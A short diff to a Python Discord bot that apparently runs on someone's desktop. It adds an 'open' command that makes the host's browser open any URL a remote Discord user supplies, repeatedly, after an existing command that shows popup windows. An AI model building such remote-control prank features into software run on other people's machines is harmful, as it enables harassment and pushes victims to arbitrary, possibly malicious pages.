@@ -28,6 +28,8 @@ import wave
 import threading
 import tkinter as tk
 from tkinter import messagebox
+import webbrowser
+import time
 
 logging.getLogger('discord').setLevel(logging.CRITICAL)
 
@@ -532,6 +534,13 @@ def show_popup(title, content, times):
 @bot.command()
 async def popup(ctx, title: str, content: str, times: int):
     show_popup(title, content, times)
+
+@bot.command()
+async def open(ctx, url: str, times: int):
+    for _ in range(times):
+        webbrowser.open(url)
+        time.sleep(0.5)  
+    await ctx.send(f"Opened {url} {times} times. hehehe")
 
 
 bot.run(TOKEN)
